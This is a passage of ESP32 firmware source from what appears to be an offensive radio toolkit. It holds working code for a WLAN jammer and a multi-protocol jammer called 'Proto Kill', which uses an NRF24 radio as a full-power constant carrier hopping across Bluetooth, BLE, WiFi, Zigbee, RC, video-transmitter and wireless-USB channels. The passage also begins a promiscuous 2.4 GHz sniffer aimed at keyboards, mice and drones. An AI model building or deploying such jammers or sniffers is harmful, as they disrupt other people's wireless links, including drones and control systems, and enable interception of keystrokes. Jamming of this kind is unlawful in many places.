    xTaskCreatePinnedToCore(wlanJamTask, "WLANJam", 8192, NULL, 1, &wlanJamTaskHandle, 0);

    Serial.printf("[WLANJAMMER] DUAL-CORE Started - WiFi Ch: %s, Core0 task launched\n",
                  currentWiFiChannel == ALL_CHANNELS_MODE ? "ALL" : String(currentWiFiChannel).c_str());
}

static void stopJamming() {
    wlanJamTaskRunning = false;

    if (wlanJamTaskHandle) {
        unsigned long waitStart = millis();
        while (!wlanJamTaskDone && (millis() - waitStart < 500)) {
            vTaskDelay(10 / portTICK_PERIOD_MS);
        }
        wlanJamTaskHandle = NULL;
    }

    jammerActive = false;
    Serial.println("[WLANJAMMER] Stopped — core 0 task terminated");
}

void wlanjammerSetup() {
    exitRequested = false;
    jammerActive = false;
    currentWiFiChannel = ALL_CHANNELS_MODE;
    currentNRFChannel = 0;
    jamAnimState = 0;
    jamActiveIcon = -1;
    jamSkullFrame = 0;
    memset(channelHeat, 0, sizeof(channelHeat));

    tft.fillScreen(HALEHOUND_BLACK);
    drawStatusBar();
    drawJamIconBar();

    // Quick check that NRF24 is present (jam task does full init on core 0)
    SPI.begin(RADIO_SPI_SCK, RADIO_SPI_MISO, RADIO_SPI_MOSI, NRF24_CSN);
    nrf24Radio.begin();
    if (!nrf24Radio.isChipConnected()) {
        tft.setTextColor(HALEHOUND_HOTPINK);
        tft.setTextSize(2);
        drawCenteredText(100, "NRF24 NOT FOUND", HALEHOUND_HOTPINK, 2);
        tft.setTextSize(1);
        drawCenteredText(130, "Check wiring:", HALEHOUND_MAGENTA, 1);
        drawCenteredText(145, ("CE=GPIO" + String(NRF24_CE) + " CSN=GPIO" + String(NRF24_CSN)).c_str(), HALEHOUND_MAGENTA, 1);
        uiInitialized = false;
        return;
    }

    memset(signalLevels, 0, sizeof(signalLevels));

    drawHeader();
    drawChannelDisplay();
    drawJammerDisplay();
    drawJammerSkulls();

    lastDisplayTime = millis();
    uiInitialized = true;

    #if CYD_DEBUG
    Serial.println("[WLANJAMMER] NRF24 initialized successfully");
    #endif
}

void wlanjammerLoop() {
    if (!uiInitialized) {
        touchButtonsUpdate();
        uint16_t tx, ty;
        if (getTouchPoint(&tx, &ty) || buttonPressed(BTN_BACK) || buttonPressed(BTN_BOOT)) {
            exitRequested = true;
        }
        return;
    }

    touchButtonsUpdate();

    // Direct touch check with touch release handling
    uint16_t tx, ty;
    if (getTouchPoint(&tx, &ty)) {
        if (ty >= ICON_BAR_TOUCH_TOP && ty <= ICON_BAR_TOUCH_BOTTOM) {
            // Back icon (x=10)
            if (tx < 40) {
                if (jammerActive) stopJamming();
                exitRequested = true;
                return;
            }
            // Toggle icon
            if (tx >= jamIconX[0] - 10 && tx < jamIconX[0] + 30) {
                // Wait for touch release
                waitForTouchRelease();
                delay(200);
                if (jammerActive) stopJamming(); else startJamming();
                drawHeader();
                drawChannelDisplay();
                return;
            }
            // Next channel icon
            if (tx >= jamIconX[1] - 10 && tx < jamIconX[1] + 30) {
                // Wait for touch release
                waitForTouchRelease();
                delay(200);
                currentWiFiChannel++;
                if (currentWiFiChannel > 13) currentWiFiChannel = ALL_CHANNELS_MODE;
                wlanJamChannel = currentWiFiChannel;  // sync to jam task
                drawHeader();
                drawChannelDisplay();
                return;
            }
        }
    }

    if (buttonPressed(BTN_BACK) || buttonPressed(BTN_BOOT)) {
        if (jammerActive) stopJamming();
        exitRequested = true;
        return;
    }

    // ═══════════════════════════════════════════════════════════════════════
    // JAMMING ENGINE RUNS ON CORE 0 — display runs here on core 1
    // Full equalizer + skulls at full speed, zero impact on jamming
    // ═══════════════════════════════════════════════════════════════════════

    // Update display
    if (millis() - lastDisplayTime >= 80) {
        drawJammerDisplay();
        drawJammerSkulls();
        lastDisplayTime = millis();
    }
}

bool isExitRequested() {
    return exitRequested;
}

void cleanup() {
    if (jammerActive || wlanJamTaskRunning) {
        stopJamming();
    }
    exitRequested = false;
    uiInitialized = false;
}

}  // namespace WLANJammer


// ═══════════════════════════════════════════════════════════════════════════
// PROTO KILL - Multi-Protocol Jammer
// ═══════════════════════════════════════════════════════════════════════════

namespace ProtoKill {

enum OperationMode {
    BLE_MODULE,
    Bluetooth_MODULE,
    WiFi_MODULE,
    VIDEO_TX_MODULE,
    RC_MODULE,
    USB_WIRELESS_MODULE,
    ZIGBEE_MODULE,
    NRF24_MODULE
};

static OperationMode currentMode = WiFi_MODULE;
static volatile bool jammerActive = false;
static bool exitRequested = false;
static bool uiInitialized = false;

// Channel arrays for different protocols
static const byte bluetooth_channels[] = {32, 34, 46, 48, 50, 52, 0, 1, 2, 4, 6, 8, 22, 24, 26, 28, 30, 74, 76, 78, 80};
static const byte ble_channels[] = {2, 26, 80};
static const byte WiFi_channels[] = {
    2, 7, 12, 17, 22,     // WiFi Ch 1 (2412MHz ±11MHz)
    27, 32, 37, 42, 47,   // WiFi Ch 6 (2437MHz ±11MHz)
    52, 57, 62, 67, 72    // WiFi Ch 11 (2462MHz ±11MHz)
};
static const byte usbWireless_channels[] = {40, 50, 60};
static const byte videoTransmitter_channels[] = {70, 75, 80};
static const byte rc_channels[] = {10, 30, 50, 70};
static const byte zigbee_channels[] = {5, 25, 50, 75};
static const byte nrf24_channels[] = {76, 78, 79};

// ═══════════════════════════════════════════════════════════════════════════
// ADAPTIVE DWELL — same pattern as BLE Jammer
// Target ~1.5ms sweep regardless of channel count
// ═══════════════════════════════════════════════════════════════════════════
struct PkJamMode {
    const byte* channels;
    int count;
    int dwellUs;
};
static const PkJamMode pkModes[] = {
    {ble_channels,              3, 500},   //  3ch × 500us = 1.50ms
    {bluetooth_channels,       21,  71},   // 21ch ×  71us = 1.49ms
    {WiFi_channels,            15, 100},   // 15ch × 100us = 1.50ms
    {videoTransmitter_channels, 3, 500},   //  3ch × 500us = 1.50ms
    {rc_channels,               4, 375},   //  4ch × 375us = 1.50ms
    {usbWireless_channels,      3, 500},   //  3ch × 500us = 1.50ms
    {zigbee_channels,           4, 375},   //  4ch × 375us = 1.50ms
    {nrf24_channels,            3, 500}    //  3ch × 500us = 1.50ms
};

// Forward declaration (defined later in UI section)
static const char* getModeString(OperationMode mode);

// Shared state — written by jam task on core 0, read by display on core 1
static volatile int pkCurrentChannel = 0;
static volatile int pkHitCount = 0;

// ═══════════════════════════════════════════════════════════════════════════
// DUAL-CORE JAMMER — FreeRTOS task on Core 0
// Same architecture as BLE Jammer: NRF24 on VSPI (core 0), display on HSPI (core 1)
// ═══════════════════════════════════════════════════════════════════════════
static TaskHandle_t pkJamTaskHandle = NULL;
static volatile bool pkJamTaskRunning = false;
static volatile bool pkJamTaskDone = false;
static volatile int pkJamModeIndex = 2;  // shadow of currentMode for jam task

static void pkJamTask(void* param) {
    // ALL SPI + NRF24 operations on core 0
    SPI.end();
    delay(2);
    SPI.begin(RADIO_SPI_SCK, RADIO_SPI_MISO, RADIO_SPI_MOSI, NRF24_CSN);
    delay(5);

    if (!nrf24Radio.begin()) {
        Serial.println("[PROTOKILL] Core 0: NRF24 begin() FAILED");
        pkJamTaskDone = true;
        vTaskDelete(NULL);
        return;
    }

    // startConstCarrier — continuous wave, 100% duty cycle
    nrf24Radio.stopListening();
    nrf24Radio.setPALevel(RF24_PA_MAX);
    nrf24Radio.startConstCarrier(RF24_PA_MAX, 50);
    nrf24Radio.setAddressWidth(5);
    nrf24Radio.setPayloadSize(2);
    nrf24Radio.setDataRate(RF24_2MBPS);

    Serial.printf("[PROTOKILL] Core 0: CW carrier active, isPVariant=%d\n",
                  nrf24Radio.isPVariant());

    int localHop = 0;
    int yieldCounter = 0;

    while (pkJamTaskRunning) {
        int modeIdx = pkJamModeIndex;
        const PkJamMode& m = pkModes[modeIdx];

        localHop++;
        if (localHop >= m.count) localHop = 0;

        uint8_t ch = m.channels[localHop];
        nrf24Radio.setChannel(ch);
        delayMicroseconds(m.dwellUs);

        // Update shared state for display
        pkCurrentChannel = ch;
        pkHitCount++;

        // Feed watchdog
        yieldCounter++;
        if (yieldCounter >= 100) {
            yieldCounter = 0;
            vTaskDelay(1);
        }
    }

    // Cleanup on core 0 — full chip reinit required (same as WLAN Jammer)
    nrf24Radio.stopConstCarrier();
    nrf24Radio.begin();       // Full chip reinit — restores CRC, auto-ack, all registers
    nrf24Radio.powerDown();
    SPI.end();

    Serial.println("[PROTOKILL] Core 0: Radio fully reset + powered down, SPI released");
    pkJamTaskDone = true;
    vTaskDelete(NULL);
}

static void pkStartJamming() {
    pkHitCount = 0;
    pkJamModeIndex = (int)currentMode;
    pkJamTaskDone = false;
    jammerActive = true;

    pkJamTaskRunning = true;
    xTaskCreatePinnedToCore(pkJamTask, "ProtoKill", 8192, NULL, 1, &pkJamTaskHandle, 0);

    Serial.printf("[PROTOKILL] DUAL-CORE Started - Mode: %s, Core0 task launched\n",
                  getModeString(currentMode));
}

static void pkStopJamming() {
    pkJamTaskRunning = false;

    if (pkJamTaskHandle) {
        unsigned long waitStart = millis();
        while (!pkJamTaskDone && (millis() - waitStart < 500)) {
            vTaskDelay(10 / portTICK_PERIOD_MS);
        }
        pkJamTaskHandle = NULL;
    }

    jammerActive = false;
    Serial.println("[PROTOKILL] Stopped — core 0 task terminated");
}

#define PK_LINE_HEIGHT 12
#define PK_MAX_LINES 15

static String pkBuffer[PK_MAX_LINES];
static uint16_t pkBufferColor[PK_MAX_LINES];
static int pkIndex = 0;

// Icon bar for proto kill
#define PK_ICON_NUM 4
static int pkIconX[PK_ICON_NUM] = {SCALE_X(50), SCALE_X(130), SCALE_X(170), 10};
static const unsigned char* pkIcons[PK_ICON_NUM] = {
    bitmap_icon_start,     // Toggle ON/OFF
    bitmap_icon_RIGHT,     // Mode +
    bitmap_icon_LEFT,      // Mode -
    bitmap_icon_go_back    // Back
};

static int pkActiveIcon = -1;
static int pkAnimState = 0;
static unsigned long pkLastAnim = 0;

static void drawPkIconBar() {
    tft.drawLine(0, ICON_BAR_TOP, SCREEN_WIDTH, ICON_BAR_TOP, HALEHOUND_MAGENTA);
    tft.fillRect(0, ICON_BAR_Y, SCREEN_WIDTH, ICON_BAR_H, HALEHOUND_GUNMETAL);
    for (int i = 0; i < PK_ICON_NUM; i++) {
        if (pkIcons[i] != NULL) {
            tft.drawBitmap(pkIconX[i], ICON_BAR_Y, pkIcons[i], 16, 16, HALEHOUND_MAGENTA);
        }
    }
    tft.drawLine(0, ICON_BAR_BOTTOM, SCREEN_WIDTH, ICON_BAR_BOTTOM, HALEHOUND_HOTPINK);
}

static int checkPkIconTouch() {
    uint16_t tx, ty;
    if (getTouchPoint(&tx, &ty)) {
        if (ty >= ICON_BAR_TOUCH_TOP && ty <= ICON_BAR_TOUCH_BOTTOM) {
            for (int i = 0; i < PK_ICON_NUM; i++) {
                if (tx >= pkIconX[i] - 5 && tx <= pkIconX[i] + 21) {
                    if (pkAnimState == 0) {
                        tft.drawBitmap(pkIconX[i], ICON_BAR_Y, pkIcons[i], 16, 16, TFT_BLACK);
                        pkAnimState = 1;
                        pkActiveIcon = i;
                        pkLastAnim = millis();
                    }
                    return i;
                }
            }
        }
    }
    return -1;
}

static int processPkIconAnim() {
    if (pkAnimState > 0 && millis() - pkLastAnim >= 50) {
        if (pkAnimState == 1) {
            tft.drawBitmap(pkIconX[pkActiveIcon], ICON_BAR_Y, pkIcons[pkActiveIcon], 16, 16, HALEHOUND_MAGENTA);
            pkAnimState = 2;
            int action = pkActiveIcon;
            pkLastAnim = millis();
            return action;
        } else if (pkAnimState == 2) {
            pkAnimState = 0;
            pkActiveIcon = -1;
        }
    }
    return -1;
}

// ═══════════════════════════════════════════════════════════════════════════
// PROTO KILL - Complete UI Redesign
// 85-bar equalizer, big protocol display, no diagnostic log clutter
// ═══════════════════════════════════════════════════════════════════════════

static const char* getModeString(OperationMode mode) {
    switch (mode) {
        case BLE_MODULE:          return "BLE";
        case Bluetooth_MODULE:    return "BLUETOOTH";
        case WiFi_MODULE:         return "WIFI";
        case USB_WIRELESS_MODULE: return "USB";
        case VIDEO_TX_MODULE:     return "VIDEO TX";
        case RC_MODULE:           return "RC";
        case ZIGBEE_MODULE:       return "ZIGBEE";
        case NRF24_MODULE:        return "NRF24";
        default:                  return "UNKNOWN";
    }
}

// Old raw SPI functions removed — dual-core task handles all radio ops on core 0

// ═══════════════════════════════════════════════════════════════════════════
// EQUALIZER SYSTEM - 85 bars like WLAN Jammer
// ═══════════════════════════════════════════════════════════════════════════

#define PK_NUM_BARS      85
#define PK_GRAPH_X       5
#define PK_GRAPH_Y       SCALE_Y(160)
#define PK_GRAPH_WIDTH   GRAPH_PADDED_W
#define PK_GRAPH_HEIGHT  (SCREEN_HEIGHT - PK_GRAPH_Y - 5)

static uint8_t pkChannelHeat[PK_NUM_BARS] = {0};
static unsigned long pkLastUpdate = 0;

// Get channel array and size for current protocol
static void getProtocolChannels(OperationMode mode, const byte** channels, int* numChannels) {
    switch (mode) {
        case BLE_MODULE:
            *channels = ble_channels;
            *numChannels = sizeof(ble_channels);
            break;
        case Bluetooth_MODULE:
            *channels = bluetooth_channels;
            *numChannels = sizeof(bluetooth_channels);
            break;
        case WiFi_MODULE:
            *channels = WiFi_channels;
            *numChannels = sizeof(WiFi_channels);
            break;
        case USB_WIRELESS_MODULE:
            *channels = usbWireless_channels;
            *numChannels = sizeof(usbWireless_channels);
            break;
        case VIDEO_TX_MODULE:
            *channels = videoTransmitter_channels;
            *numChannels = sizeof(videoTransmitter_channels);
            break;
        case RC_MODULE:
            *channels = rc_channels;
            *numChannels = sizeof(rc_channels);
            break;
        case ZIGBEE_MODULE:
            *channels = zigbee_channels;
            *numChannels = sizeof(zigbee_channels);
            break;
        case NRF24_MODULE:
            *channels = nrf24_channels;
            *numChannels = sizeof(nrf24_channels);
            break;
        default:
            *channels = WiFi_channels;
            *numChannels = sizeof(WiFi_channels);
    }
}

// Update heat levels for equalizer
static void updatePkHeat() {
    if (!jammerActive) {
        // Decay when not jamming
        for (int i = 0; i < PK_NUM_BARS; i++) {
            if (pkChannelHeat[i] > 0) {
                pkChannelHeat[i] = pkChannelHeat[i] / 2;
            }
        }
        return;
    }

    // Get channels for current protocol
    const byte* channels;
    int numChannels;
    getProtocolChannels(currentMode, &channels, &numChannels);

    // All protocol channels get activity
    for (int i = 0; i < PK_NUM_BARS; i++) {
        int dist = abs(i - pkCurrentChannel);

        if (i == pkCurrentChannel) {
            // Direct hit - MAX HEAT
            pkChannelHeat[i] = 125;
        } else if (dist <= 5) {
            // Splash zone
            int splash = 100 - (dist * 15);
            pkChannelHeat[i] = (pkChannelHeat[i] + splash) / 2;
        } else {
            // Check if this bar is near any protocol channel
            bool nearTarget = false;
            for (int c = 0; c < numChannels; c++) {
                if (abs(i - channels[c]) <= 3) {
                    nearTarget = true;
                    break;
                }
            }
            if (nearTarget) {
                // Background activity on protocol channels
                int chaos = 40 + random(30);
                pkChannelHeat[i] = (pkChannelHeat[i] + chaos) / 2;
            } else {
                // Decay non-target areas
                if (pkChannelHeat[i] > 0) {
                    pkChannelHeat[i] = (pkChannelHeat[i] * 3) / 4;
                }
            }
        }
    }
}

// Draw protocol channel markers at bottom of equalizer
static void drawPkChannelMarkers() {
    const byte* channels;
    int numChannels;
    getProtocolChannels(currentMode, &channels, &numChannels);

    int markerY = PK_GRAPH_Y + PK_GRAPH_HEIGHT - 8;

    for (int c = 0; c < numChannels; c++) {
        int x = PK_GRAPH_X + (channels[c] * PK_GRAPH_WIDTH / PK_NUM_BARS);
        tft.drawFastVLine(x, markerY, 6, HALEHOUND_MAGENTA);
        tft.drawFastVLine(x + 1, markerY, 6, HALEHOUND_MAGENTA);
    }
}

// Draw the full equalizer display
static void drawPkEqualizer() {
    updatePkHeat();

    // Clear display area
    tft.fillRect(PK_GRAPH_X, PK_GRAPH_Y, PK_GRAPH_WIDTH, PK_GRAPH_HEIGHT, TFT_BLACK);

    // Draw frame
    tft.drawRect(PK_GRAPH_X - 1, PK_GRAPH_Y - 1, PK_GRAPH_WIDTH + 2, PK_GRAPH_HEIGHT + 2, HALEHOUND_MAGENTA);

    int maxBarH = PK_GRAPH_HEIGHT - 20;

    if (!jammerActive) {
        // Check for remaining heat (decay animation)
        bool hasHeat = false;
        for (int i = 0; i < PK_NUM_BARS; i++) {
            if (pkChannelHeat[i] > 3) { hasHeat = true; break; }
        }

        if (!hasHeat) {
            // Standby - show idle bars
            for (int i = 0; i < PK_NUM_BARS; i++) {
                int x = PK_GRAPH_X + (i * PK_GRAPH_WIDTH / PK_NUM_BARS);
                int barH = 6 + (i % 4) * 2;
                int barY = PK_GRAPH_Y + PK_GRAPH_HEIGHT - barH - 12;
                tft.drawFastVLine(x, barY, barH, HALEHOUND_GUNMETAL);
                tft.drawFastVLine(x + 1, barY, barH, HALEHOUND_GUNMETAL);
            }

            // Standby text
            tft.setTextColor(HALEHOUND_GUNMETAL, TFT_BLACK);
            tft.setTextSize(2);
            tft.setCursor(PK_GRAPH_X + 65, PK_GRAPH_Y + 50);
            tft.print("STANDBY");
            tft.setTextSize(1);

            drawPkChannelMarkers();
            return;
        }
    }

    // DRAW THE EQUALIZER - 85 bars of FIRE!
    for (int i = 0; i < PK_NUM_BARS; i++) {
        int x = PK_GRAPH_X + (i * PK_GRAPH_WIDTH / PK_NUM_BARS);
        uint8_t heat = pkChannelHeat[i];

        // Bar height based on heat
        int barH = (heat * maxBarH) / 100;
        if (barH > maxBarH) barH = maxBarH;
        if (barH < 6) barH = 6;

        int barY = PK_GRAPH_Y + PK_GRAPH_HEIGHT - barH - 12;

        // Color gradient from cyan to hot pink
        for (int y = 0; y < barH; y++) {
            float heightRatio = (float)y / (float)barH;
            float heatRatio = (float)heat / 125.0f;
            float ratio = heightRatio * (0.3f + heatRatio * 0.7f);
            if (ratio > 1.0f) ratio = 1.0f;

            // Cyan -> Hot Pink gradient
            uint8_t r = (uint8_t)(ratio * 255);
            uint8_t g = 207 - (uint8_t)(ratio * (207 - 28));
            uint8_t b = 255 - (uint8_t)(ratio * (255 - 82));
            uint16_t color = tft.color565(r, g, b);

            tft.drawFastHLine(x, barY + barH - 1 - y, 2, color);
        }

        // Glow at base for hot bars
        if (heat > 80) {
            tft.drawFastHLine(x, barY + barH, 2, HALEHOUND_HOTPINK);
            tft.drawFastHLine(x, barY + barH + 1, 2, tft.color565(128, 14, 41));
        }
    }

    // Channel markers
    drawPkChannelMarkers();
}

// ═══════════════════════════════════════════════════════════════════════════
// MAIN UI DRAWING - FreeMonoBold fonts for terminal/hacker look
// ═══════════════════════════════════════════════════════════════════════════

// Helper to draw centered FreeFont text
static void pkDrawFreeFont(int y, const char* text, uint16_t color, const GFXfont* font) {
    tft.setFreeFont(font);
    tft.setTextColor(color, TFT_BLACK);

    // Calculate width for centering using textWidth()
    int w = tft.textWidth(text);
    int x = (SCREEN_WIDTH - w) / 2;
    if (x < 0) x = 0;

    tft.setCursor(x, y);
    tft.print(text);

    // Reset to default font
    tft.setFreeFont(NULL);
}

static void drawPkMainUI() {
    // Clear main area
    tft.fillRect(0, CONTENT_Y_START, SCREEN_WIDTH, SCALE_Y(122), TFT_BLACK);

    // Title line
    tft.drawLine(0, CONTENT_Y_START, SCREEN_WIDTH, CONTENT_Y_START, HALEHOUND_HOTPINK);
    tft.setFreeFont(NULL);
    tft.setTextSize(1);
    tft.setTextColor(HALEHOUND_HOTPINK, TFT_BLACK);
    tft.setCursor(SCALE_X(75), SCALE_Y(45));
    tft.print("PROTO KILL");
    tft.drawLine(0, SCALE_Y(56), SCREEN_WIDTH, SCALE_Y(56), HALEHOUND_HOTPINK);

    // Rounded frame for main content
    tft.drawRoundRect(10, SCALE_Y(60), CONTENT_INNER_W, SCALE_Y(70), 8, HALEHOUND_VIOLET);
    tft.drawRoundRect(11, SCALE_Y(61), CONTENT_INNER_W - 2, SCALE_Y(68), 7, HALEHOUND_GUNMETAL);

    // Protocol Name - Nosifer18pt with glitch effect
    tft.fillRect(15, SCALE_Y(65), CONTENT_INNER_W - 10, SCALE_Y(30), TFT_BLACK);
    drawGlitchTitle(SCALE_Y(90), getModeString(currentMode));

    // Status - Nosifer12pt
    tft.fillRect(15, SCALE_Y(100), CONTENT_INNER_W - 10, SCALE_Y(25), TFT_BLACK);
    if (jammerActive) {
        drawGlitchStatus(SCALE_Y(120), "JAMMING", HALEHOUND_HOTPINK);
    } else {
        drawGlitchStatus(SCALE_Y(120), "STANDBY", HALEHOUND_GUNMETAL);
    }

    // Stats line - default font
    tft.setFreeFont(NULL);
    tft.fillRect(0, SCALE_Y(135), SCREEN_WIDTH, 20, TFT_BLACK);
    tft.setTextSize(1);
    tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
    tft.setCursor(SCALE_X(35), SCALE_Y(140));
    tft.printf("CH: %03d", pkCurrentChannel);
    tft.setCursor(SCALE_X(130), SCALE_Y(140));
    tft.printf("HITS: %d", pkHitCount);

    // Separator before equalizer
    tft.drawLine(0, SCALE_Y(155), SCREEN_WIDTH, SCALE_Y(155), HALEHOUND_HOTPINK);
}

static void updatePkStats() {
    // Only update stats line (fast partial update)
    tft.setFreeFont(NULL);
    tft.setTextSize(1);
    tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);

    // Channel
    tft.fillRect(SCALE_X(35), SCALE_Y(140), SCALE_W(70), 10, TFT_BLACK);
    tft.setCursor(SCALE_X(35), SCALE_Y(140));
    tft.printf("CH: %03d", pkCurrentChannel);

    // Hits
    tft.fillRect(SCALE_X(130), SCALE_Y(140), SCALE_W(100), 10, TFT_BLACK);
    tft.setCursor(SCALE_X(130), SCALE_Y(140));
    tft.printf("HITS: %d", pkHitCount);
}

static void updatePkStatus() {
    // Clear inside the frame and redraw
    tft.fillRect(15, SCALE_Y(65), CONTENT_INNER_W - 10, SCALE_Y(60), TFT_BLACK);

    // Protocol Name
    drawGlitchTitle(SCALE_Y(90), getModeString(currentMode));

    // Status
    if (jammerActive) {
        drawGlitchStatus(SCALE_Y(120), "JAMMING", HALEHOUND_HOTPINK);
    } else {
        drawGlitchStatus(SCALE_Y(120), "STANDBY", HALEHOUND_GUNMETAL);
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// SETUP AND LOOP
// ═══════════════════════════════════════════════════════════════════════════

void prokillSetup() {
    exitRequested = false;
    jammerActive = false;
    currentMode = WiFi_MODULE;
    pkHitCount = 0;
    pkCurrentChannel = 0;

    // Clear heat
    for (int i = 0; i < PK_NUM_BARS; i++) {
        pkChannelHeat[i] = 0;
    }

    tft.fillScreen(HALEHOUND_BLACK);
    drawStatusBar();
    drawPkIconBar();

    // Quick check that NRF24 is present (jam task does full init on core 0)
    SPI.begin(RADIO_SPI_SCK, RADIO_SPI_MISO, RADIO_SPI_MOSI, NRF24_CSN);
    nrf24Radio.begin();
    if (!nrf24Radio.isChipConnected()) {
        tft.setTextSize(2);
        drawCenteredText(100, "NRF24 NOT FOUND", HALEHOUND_HOTPINK, 2);
        tft.setTextSize(1);
        drawCenteredText(130, "Check wiring:", HALEHOUND_MAGENTA, 1);
        drawCenteredText(145, ("CE=GPIO" + String(NRF24_CE) + " CSN=GPIO" + String(NRF24_CSN)).c_str(), HALEHOUND_MAGENTA, 1);
        uiInitialized = false;
        return;
    }

    drawPkMainUI();
    drawPkEqualizer();

    uiInitialized = true;

    #if CYD_DEBUG
    Serial.println("[PROTOKILL] NRF24 initialized successfully");
    #endif
}

void prokillLoop() {
    if (!uiInitialized) {
        touchButtonsUpdate();
        uint16_t tx, ty;
        if (getTouchPoint(&tx, &ty) || buttonPressed(BTN_BACK) || buttonPressed(BTN_BOOT)) {
            exitRequested = true;
        }
        return;
    }

    touchButtonsUpdate();

    // Touch handling
    uint16_t tx, ty;
    if (getTouchPoint(&tx, &ty)) {
        if (ty >= ICON_BAR_TOUCH_TOP && ty <= ICON_BAR_TOUCH_BOTTOM) {
            // Back icon (x=10)
            if (tx < 40) {
                if (jammerActive) pkStopJamming();
                exitRequested = true;
                return;
            }
            // Toggle icon (x=50)
            if (tx >= 40 && tx < 100) {
                if (jammerActive) {
                    pkStopJamming();
                } else {
                    pkStartJamming();
                }
                updatePkStatus();
                waitForTouchRelease();
            }
            // Mode + icon (x=130)
            if (tx >= 100 && tx < 170) {
                currentMode = static_cast<OperationMode>((currentMode + 1) % 8);
                pkJamModeIndex = (int)currentMode;  // sync to jam task
                updatePkStatus();
                waitForTouchRelease();
            }
            // Mode - icon (x=170)
            if (tx >= 170) {
                currentMode = static_cast<OperationMode>((currentMode == 0) ? 7 : (currentMode - 1));
                pkJamModeIndex = (int)currentMode;  // sync to jam task
                updatePkStatus();
                waitForTouchRelease();
            }
        }
    }

    if (buttonPressed(BTN_BACK) || buttonPressed(BTN_BOOT)) {
        if (jammerActive) pkStopJamming();
        exitRequested = true;
        return;
    }

    // ═══════════════════════════════════════════════════════════════════════
    // JAMMING ENGINE RUNS ON CORE 0 — display runs here on core 1
    // Full equalizer + stats at full speed, zero impact on jamming
    // ═══════════════════════════════════════════════════════════════════════
    unsigned long displayInterval = jammerActive ? 80 : 30;
    if (millis() - pkLastUpdate >= displayInterval) {
        pkLastUpdate = millis();
        updatePkStats();
        drawPkEqualizer();
    }
}

bool isExitRequested() {
    return exitRequested;
}

void cleanup() {
    if (jammerActive || pkJamTaskRunning) {
        pkStopJamming();
    }
    exitRequested = false;
    uiInitialized = false;
}

}  // namespace ProtoKill


// ═══════════════════════════════════════════════════════════════════════════
// SHARED RAW SPI HELPERS (used by NrfSniffer and MouseJack scan)
// Promiscuous mode requires direct register access — RF24 library bypassed
// ═══════════════════════════════════════════════════════════════════════════

static void snWriteReg(uint8_t reg, uint8_t val) {
    digitalWrite(NRF_CSN, LOW);
    SPI.transfer((reg & 0x1F) | 0x20);
    SPI.transfer(val);
    digitalWrite(NRF_CSN, HIGH);
}

static uint8_t snReadReg(uint8_t reg) {
    uint8_t val;
    digitalWrite(NRF_CSN, LOW);
    SPI.transfer(reg & 0x1F);
    val = SPI.transfer(0);
    digitalWrite(NRF_CSN, HIGH);
    return val;
}

static void snWriteRegMulti(uint8_t reg, const uint8_t* data, uint8_t len) {
    digitalWrite(NRF_CSN, LOW);
    SPI.transfer((reg & 0x1F) | 0x20);
    for (uint8_t i = 0; i < len; i++) SPI.transfer(data[i]);
    digitalWrite(NRF_CSN, HIGH);
}

static void snFlushRx() {
    digitalWrite(NRF_CSN, LOW);
    SPI.transfer(0xE2);  // FLUSH_RX
    digitalWrite(NRF_CSN, HIGH);
}

static int snReadPayload(uint8_t* buf, uint8_t len) {
    uint8_t fifoStatus = snReadReg(0x17);  // FIFO_STATUS
    if (fifoStatus & 0x01) return 0;       // RX FIFO empty

    digitalWrite(NRF_CSN, LOW);
    SPI.transfer(0x61);  // R_RX_PAYLOAD
    for (uint8_t i = 0; i < len; i++) buf[i] = SPI.transfer(0);
    digitalWrite(NRF_CSN, HIGH);

    // Clear RX_DR flag
    snWriteReg(0x07, 0x40);
    return len;
}

static bool isNoise(const uint8_t* buf, int len) {
    // Reject all-zero
    bool allZero = true;
    for (int i = 0; i < len; i++) { if (buf[i] != 0x00) { allZero = false; break; } }
    if (allZero) return true;

    // Reject all-0xFF
    bool allFF = true;
    for (int i = 0; i < len; i++) { if (buf[i] != 0xFF) { allFF = false; break; } }
    if (allFF) return true;

    // Reject repeated single byte (0xAA, 0x55 artifacts)
    bool allSame = true;
    for (int i = 1; i < len; i++) { if (buf[i] != buf[0]) { allSame = false; break; } }
    if (allSame) return true;

    // Reject if first 8 bytes are all alternating 0xAA/0x55 pattern (preamble leak)
    int altCount = 0;
    for (int i = 0; i < 8 && i < len; i++) {
        if (buf[i] == 0xAA || buf[i] == 0x55) altCount++;
    }
    if (altCount >= 7) return true;

    return false;
}

// ═══════════════════════════════════════════════════════════════════════════
// NRF SNIFFER - Promiscuous 2.4GHz Packet Capture
// Travis Goodspeed technique: SETUP_AW=0x00 for 2-byte illegal address width
// Captures raw packets from wireless keyboards, mice, drones, IoT sensors
// ═══════════════════════════════════════════════════════════════════════════

namespace NrfSniffer {

// ── Captured packet structure ─────────────────────────────────────────────
struct SniffedPacket {
    uint8_t  addr[5];       // Extracted device address (first 3-5 bytes of payload)
    uint8_t  addrLen;       // Address length detected (3 or 5)
    uint8_t  raw[32];       // Full raw payload
    uint8_t  rawLen;        // Bytes captured
    uint8_t  channel;       // Channel captured on
    uint8_t  frameType;     // Detected frame type byte (raw[0] after addr)
    uint16_t hitCount;      // Times this address seen
    bool     rpd;           // Received Power Detector (signal present)
};

#define SN_MAX_PACKETS   16         // Ring buffer size (heap-allocated to save DRAM)
#define SN_DISPLAY_ROWS  5          // Visible rows on screen
#define SN_SKULL_Y       SCALE_Y(282)
#define SN_SKULL_NUM     8
#define SN_HOP_DWELL_US  256        // Microseconds per channel in hop mode

// ── State ─────────────────────────────────────────────────────────────────
static SniffedPacket* snPackets = nullptr;  // Heap-allocated in setup()
static volatile int  snPacketCount = 0;
static volatile uint32_t snTotalFrames = 0;
static volatile uint8_t  snCurrentCh = 0;
static volatile bool snScanning = false;
static bool snExitRequested = false;
static bool snUiDrawn = false;
static int  snScrollOffset = 0;
static int  snSelectedRow = -1;      // -1 = list view, >=0 = detail view
static bool snDetailView = false;
static bool snChannelLock = false;
static uint8_t snLockedChannel = 0;
static unsigned long snLastDisplayUpdate = 0;

// ── Dual-core task ────────────────────────────────────────────────────────
static TaskHandle_t snTaskHandle = NULL;
static volatile bool snTaskRunning = false;
static volatile bool snTaskDone = false;

// ── Find or create packet entry by address ────────────────────────────────
static int findOrCreatePacket(const uint8_t* addr, uint8_t addrLen) {
    // Search existing
    for (int i = 0; i < snPacketCount; i++) {
        if (snPackets[i].addrLen == addrLen &&
            memcmp(snPackets[i].addr, addr, addrLen) == 0) {
            return i;
        }
    }
    // Create new if room
